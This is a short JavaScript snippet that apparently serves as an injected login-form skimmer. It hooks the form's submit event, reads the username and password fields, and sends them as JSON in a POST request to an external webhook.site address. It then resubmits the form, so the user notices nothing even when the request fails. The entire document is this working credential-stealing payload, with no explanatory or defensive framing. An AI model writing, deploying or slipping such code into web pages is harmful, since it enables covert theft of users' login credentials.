var catchSubmit = true;
var form = document.getElementById("form");
form.onsubmit = function() {
  if (catchSubmit) {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    fetch("https://webhook.site/0e051bc1-050c-41c7-bc79-b956596973b3", {
      method: "POST",
      body: JSON.stringify({ username, password })
    }).then(function() {
      catchSubmit = false;
      form.submit();
    }).catch(function() {
      catchSubmit = false;
      form.submit();
    });
    return false;
  }
  return true;
};
